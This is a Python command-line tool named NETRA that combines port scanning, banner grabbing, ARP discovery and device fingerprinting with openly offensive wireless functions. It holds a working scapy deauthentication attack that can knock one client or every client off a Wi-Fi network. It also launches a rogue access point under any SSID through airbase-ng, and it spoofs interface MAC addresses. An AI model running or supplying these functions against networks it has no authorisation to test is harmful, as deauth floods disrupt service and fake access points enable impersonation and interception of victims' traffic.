#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from modules.arp_scan import get_mac
from modules.hostname import get_hostname
from modules.vendor_lookup import load_oui_db, get_vendor
from modules.port_scan import scan_ports, common_ports
from modules.banner import get_banner
from modules.fingerprint import identify_device
from modules.utils import log, C, suggest_next_steps

import argparse
import time
import sys
import webbrowser
import socket
import os
import subprocess
import json
import re
import ipaddress
from scapy.all import RandMAC, Ether, srp, ARP, Dot11, Dot11Deauth, sendp, RadioTap

GITHUB_URL = "https://github.com/akbas70"
HELPFUL_LINKS = [
    f"{C.B}1. ARP packet configuration: https://en.wikipedia.org/wiki/Address_Resolution_Protocol{C.END}",
    f"{C.B}2. OUI (Vendor MAC) database: https://standards-oui.ieee.org/{C.END}",
    f"{C.B}3. Port scanning theory: https://en.wikipedia.org/wiki/Port_scanning{C.END}"
]

# HELPER FUNCTIONS 

def check_root():
    # Check if script is run as root
    if os.geteuid() != 0:
        log(f"{C.R}ERROR: This function requires ROOT privileges. Please run with sudo.{C.END}")
        sys.exit(1)

def check_interface_exists(interface):
    # Check if network interface exists
    try:
        subprocess.run(["ip", "link", "show", interface], check=True, capture_output=True)
        return True
    except subprocess.CalledProcessError:
        log(f"{C.R}ERROR: Interface '{interface}' does not exist.{C.END}")
        return False

def check_monitor_mode(interface):
    # Check if interface is in Monitor mode
    try:
        result = subprocess.run(["iwconfig", interface], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            return True
    except:
        pass
    return False

def check_dependencies():
    # Check if required dependencies are installed
    dependencies = ["airbase-ng", "iwconfig", "ifconfig", "ip"]
    for dep in dependencies:
        try:
            subprocess.run(["which", dep], check=True, capture_output=True)
        except:
            log(f"{C.R}ERROR: Missing dependency: {dep}.{C.END}")
            return False
    return True

def check_network_config(interface):
    # Check if interface is UP and has valid configuration
    try:
        result = subprocess.run(["ip", "-j", "addr", "show", interface], 
                              capture_output=True, text=True)
        data = json.loads(result.stdout)[0]
        if data['operstate'] != 'UP':
            log(f"{C.R}ERROR: Interface {interface} is DOWN.{C.END}")
            return False
        return True
    except:
        return False

def change_mac_address(interface, new_mac=None):
    # Change MAC address using ifconfig (REQUIRES ROOT). Use subprocess for safety.
    check_root()
    if not check_interface_exists(interface):
        return False
    
    if new_mac is None:
        new_mac = str(RandMAC())
    
    # Validate MAC format
    if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', new_mac.upper()):
        log(f"{C.R}ERROR: Invalid MAC format. Format should be XX:XX:XX:XX:XX:XX.{C.END}")
        return False
    
    log(f"Attempting to change MAC for {interface} to {C.Y}{new_mac}{C.END}")
    try:
        subprocess.run(["ifconfig", interface, "down"], check=True)
        subprocess.run(["ifconfig", interface, "hw", "ether", new_mac], check=True)
        subprocess.run(["ifconfig", interface, "up"], check=True)
        log(f"{C.G}MAC for {interface} successfully changed.{C.END}")
        return True
    except subprocess.CalledProcessError as e:
        log(f"{C.R}Error changing MAC: Operation failed. Interface may be busy.{C.END}")
        return False

def suggest_next_steps(target, mac, open_ports, vendor):
    """Provides command suggestions based on failed/incomplete scan results."""
    suggestions = []

    if not mac or not vendor:
        suggestions.append(
            f"-> {C.Y}MAC/Vendor not found.{C.END} Try running a broader network scan (if on LAN):"
        )
        suggestions.append(
            f"   {C.B}Example:{C.END} python3 netra.py wireless netscan -i wlan0 -r 192.168.1.0/24"
        )
    
    if not open_ports:
        suggestions.append(
            f"-> {C.Y}No default ports are open.{C.END} Try scanning a wider range of ports:"
        )
        suggestions.append(
            f"   {C.B}Example:{C.END} python3 netra.py scan -t {target} --ports 1-1000"
        )
        suggestions.append(
            f"-> {C.Y}Target may be offline or heavily firewalled.{C.END} Double-check IP connectivity."
        )

    if suggestions:
        log("\n" + f"{C.R}--- SCAN FAILURE SUGGESTIONS ---{C.END}")
        for suggestion in suggestions:
            print(suggestion)
        log(f"{C.R}--------------------------------{C.END}")

#CORE FUNCTIONS (SCAN) 

def run_scan_analysis(args):
    # Device fingerprinting and port scan logic
    target = args.target
    log(f"{C.B}Analyzing device: {target}{C.END}")
    
    hostname = get_hostname(target)
    log(f"Hostname: {C.G}{hostname}{C.END}" if hostname else f"Hostname: {C.R}Not available.{C.END}")

    mac = get_mac(target)
    log(f"MAC Address: {C.Y}{mac}{C.END}" if mac else f"MAC address: {C.R}Not available (not in LAN?).{C.END}")

    vendor = None
    if mac:
        oui_db = load_oui_db(args.oui)
        vendor = get_vendor(mac, oui_db)
        log(f"Vendor: {C.G}{vendor}{C.END}" if vendor else f"Vendor: {C.Y}Not found in OUI DB.{C.END}")

    ports = [80, 443, 22, 23, 554, 8080, 8000, 21, 25, 110, 139, 445]
    
    if args.ports:
        try:
            ports = []
            for item in args.ports.split(","):
                if '-' in item:
                    start, end = map(int, item.split('-'))
                    ports.extend(range(start, end + 1))
                else:
                    ports.append(int(item.strip()))
        except ValueError:
            log(f"{C.R}Invalid port format. Using default ports.{C.END}")

    log(f"{C.B}Scanning {len(ports)} ports...{C.END}")
    start = time.time()
    scan_results = scan_ports(target, ports)
    elapsed = time.time() - start
    
    port_results = []
    for port, ok in scan_results:
        banner = get_banner(target, port) if ok else None
        port_results.append((port, ok, banner))
        if ok:
            log(f"Port {C.Y}{port}{C.END} OPEN -> Banner: {banner}")

    open_ports = [p for p, ok, b in port_results if ok]
    banners_combined = " ".join(b for _, ok, b in port_results if ok and b)
    device_type = identify_device(open_ports, banners_combined)
    log(f"{C.B}Likely device type: {C.G}{device_type}{C.END}")
    log(f"{C.B}Scan completed in {elapsed:.2f} seconds.{C.END}")

    if not mac or not open_ports:
        suggest_next_steps(target, mac, open_ports, vendor)

# WIRELESS FUNCTIONS

def deauther_target(args):
    # Deauth Attack (Targeted or Blind/Broadcast)
    check_root()
    if not check_interface_exists(args.interface): return False
    if not check_monitor_mode(args.interface): 
        log(f"{C.R}ERROR: Interface {args.interface} is not in Monitor mode.{C.END}")
        return False

    # Validate MAC addresses
    if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', args.target_mac.upper()):
        log(f"{C.R}ERROR: Invalid target MAC format.{C.END}")
        return False
    if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', args.gateway_mac.upper()):
        log(f"{C.R}ERROR: Invalid gateway MAC format.{C.END}")
        return False

    # Scapy packet crafting
    dot11 = Dot11(addr1=args.target_mac, addr2=args.gateway_mac, addr3=args.gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    log(f"{C.B}Sending {args.count} Deauth packets to {C.Y}{args.target_mac}{C.END} via {args.interface}...{C.END}")
    try:
        sendp(packet, iface=args.interface, count=args.count, inter=args.interval, verbose=0)
        log(f"{C.G}Deauth packets sent successfully.{C.END}")
        return True
    except Exception as e:
        log(f"{C.R}Error sending packets: {e}. Check Monitor Mode.{C.END}")
        return False

def scan_network_routers(args):
    # ARP Scan for devices in LAN
    if not check_interface_exists(args.interface): return False
    if not check_network_config(args.interface):
        return False

    network_range = args.range
    log(f"{C.B}ARP scanning network range {network_range} on {args.interface}...{C.END}")
    
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_range)
    ans, unans = srp(arp_request, timeout=args.timeout, verbose=0, iface=args.interface)
    
    if not ans:
        log(f"{C.R}No ARP responses found.{C.END}")
        return False
        
    log(f"{C.B}--- Network Scan Results ---{C.END}")
    for snd, rcv in ans:
        print(f"IP: {C.G}{rcv.psrc}{C.END} - MAC: {C.Y}{rcv.hwsrc}{C.END}")
    log(f"{C.B}----------------------------{C.END}")
    return True

def create_fake_router_ap(args):
    # Fake AP (Uses airbase-ng via subprocess)
    check_root()
    if not check_interface_exists(args.interface): return False
    if not check_monitor_mode(args.interface): 
        log(f"{C.R}ERROR: Interface {args.interface} is not in Monitor mode.{C.END}")
        return False
    if not check_dependencies(): return False
    if not check_network_config(args.interface):
        return False
    # Validate channel
    try:
        channel = int(args.channel)
        if channel < 1 or channel > 14:
            raise ValueError("Channel must be between 1 and 14")
    except ValueError as e:
        log(f"{C.R}ERROR: {e}.{C.END}")
        return False

    log(f"{C.B}Starting Fake AP: SSID={C.G}{args.ssid}{C.END}, Channel={args.channel} on {args.interface}...{C.END}")
    log(f"{C.Y}WARNING: Requires 'airbase-ng'. Press Ctrl+C to stop.{C.END}")
    
    try:
        subprocess.call(["airbase-ng", "--essid", args.ssid, "--channel", args.channel, args.interface])
        log(f"{C.G}Fake AP started successfully.{C.END}")
        return True
    except FileNotFoundError:
        log(f"{C.R}ERROR: airbase-ng not found. Please install aircrack-ng.{C.END}")
        return False
    except KeyboardInterrupt:
        log(f"{C.B}Fake AP stopped by user.{C.END}")
        return True
    except Exception as e:
        log(f"{C.R}Error starting Fake AP: {e}.{C.END}")
        return False

#  UTILS FUNCTIONS 

def handle_mac_change_cli(args):
    # Change MAC
    if not check_interface_exists(args.interface): return False
    return change_mac_address(args.interface, args.new_mac)

def show_links_cli(args):
    # Helpful Links
    log(f"{C.B}--- Helpful Links ---{C.END}")
    for link in HELPFUL_LINKS:
        print(link)
    log(f"{C.B}---------------------{C.END}")
    if args.github:
        log(f"{C.B}Opening Github: {GITHUB_URL}{C.END}")
        webbrowser.open(GITHUB_URL)

# COMMAND

def create_parser():
    parser = argparse.ArgumentParser(
        description=f"{C.B}NETRA - Wireless Device Fingerprint Scanner (CLI){C.END}",
        epilog="Use 'netra.py <command> -h' for command-specific help."
    )
    subparsers = parser.add_subparsers(dest='command', required=True, help='Select operating mode.')

    # 1. SCAN/ANALYSIS Mode
    parser_scan = subparsers.add_parser('scan', help='Scan and fingerprint devices (Port, MAC, Vendor).')
    parser_scan.add_argument("-t", "--target", required=True, help="Target IP address (e.g., 192.168.1.1).")
    parser_scan.add_argument("--ports", help="Custom port list (e.g., 22,80,443,1000-2000).")
    parser_scan.add_argument("--oui", default="oui.txt", help="OUI file path for vendor lookup.")
    parser_scan.set_defaults(func=run_scan_analysis)

    # 2. WIRELESS Mode (Attack/Wireless tools - REQUIRES ROOT)
    parser_wireless = subparsers.add_parser('wireless', help='Advanced Wi-Fi tools (Deauth, Fake AP, Netscan). REQUIRES ROOT.')
    wireless_subparsers = parser_wireless.add_subparsers(dest='wireless_command', required=True)

    # wireless deauth
    parser_deauth = wireless_subparsers.add_parser('deauth', help='Perform Deauthentication attack.')
    parser_deauth.add_argument("-i", "--interface", required=True, help="Wi-Fi interface in Monitor Mode (e.g., wlan0mon).")
    parser_deauth.add_argument("-t", "--target-mac", required=True, help="Client MAC (or FF:FF... for broadcast).")
    parser_deauth.add_argument("-g", "--gateway-mac", required=True, help="AP/Gateway MAC (BSSID).")
    parser_deauth.add_argument("-c", "--count", type=int, default=100, help="Number of Deauth packets to send.")
    parser_deauth.add_argument("--interval", type=float, default=0.1, help="Interval between packets (seconds).")
    parser_deauth.set_defaults(func=deauther_target)

    # wireless netscan
    parser_netscan = wireless_subparsers.add_parser('netscan', help='ARP scan for devices in LAN.')
    parser_netscan.add_argument("-i", "--interface", required=True, help="Network interface for ARP.")
    parser_netscan.add_argument("-r", "--range", default="192.168.1.0/24", help="Network range (e.g., 192.168.0.0/24).")
    parser_netscan.add_argument("-t", "--timeout", type=int, default=3, help="Timeout for response (seconds).")
    parser_netscan.set_defaults(func=scan_network_routers)

    # wireless fake-ap
    parser_fakeap = wireless_subparsers.add_parser('fake-ap', help='Create a Fake Access Point (Requires airbase-ng).')
    parser_fakeap.add_argument("-i", "--interface", required=True, help="Interface in Monitor Mode.")
    parser_fakeap.add_argument("--ssid", required=True, help="SSID for the Fake AP.")
    parser_fakeap.add_argument("-ch", "--channel", required=True, help="Wi-Fi Channel (1-14).")
    parser_fakeap.set_defaults(func=create_fake_router_ap)

    # 3. UTILS Mode (General utilities)
    parser_utils = subparsers.add_parser('utils', help='General utility and information commands.')
    utils_subparsers = parser_utils.add_subparsers(dest='utils_command', required=True)

    # utils mac-change
    parser_mac = utils_subparsers.add_parser('mac-change', help='Change network interface MAC address (REQUIRES ROOT).')
    parser_mac.add_argument("-i", "--interface", required=True, help="Network interface.")
    parser_mac.add_argument("-m", "--new-mac", help="New MAC address (leave blank for random).")
    parser_mac.set_defaults(func=handle_mac_change_cli)

    # utils links
    parser_links = utils_subparsers.add_parser('links', help='Show helpful links and documentation.')
    parser_links.add_argument("--github", action='store_true', help='Open the project Github page.')
    parser_links.set_defaults(func=show_links_cli)
    
    return parser

# EXECUTION 

if __name__ == "__main__":
    parser = create_parser()
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
        
    args = parser.parse_args()
    
    if hasattr(args, 'func'):
        success = args.func(args)
        if success is False:
            sys.exit(1)
    else:
        parser.print_help(sys.stderr)
